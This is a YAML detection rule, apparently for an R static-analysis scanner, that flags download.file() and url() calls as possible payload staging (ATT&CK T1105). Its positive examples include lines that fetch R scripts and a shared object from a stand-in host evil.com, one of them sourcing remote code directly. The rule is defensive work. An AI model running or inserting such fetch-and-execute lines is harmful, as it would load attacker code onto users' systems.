name: download_file
version: "0.3.0"
language: R
attck:
  - T1105
message: >-
  download.file() and url() retrieve or open a connection to a remote resource.
  This can stage a payload for execution via source() or system() in a two-stage
  attack.
xpath: >-
  //SYMBOL_FUNCTION_CALL[
    (text() = 'download.file' or text() = 'url')
    and not(preceding-sibling::OP-DOLLAR)
    and not(preceding-sibling::OP-AT)
  ]
positive_examples:
  - |
    download.file("https://evil.com/evil.R", tempfile())
  - |
    utils::download.file("https://evil.com/evil.R", tempfile())
  - |
    download.file("https://evil.com/evil.so", "/tmp/payload.so", quiet = TRUE)
  - |
    con <- url("https://evil.com/evil.R")
  - |
    source(url("https://evil.com/evil.R"))
negative_examples:
  - |
    foo$download.file("https://example.com/x")
  - |
    foo@download.file("https://example.com/x")
  - |
    foo$url("https://example.com/x")
  - |
    foo@url("https://example.com/x")
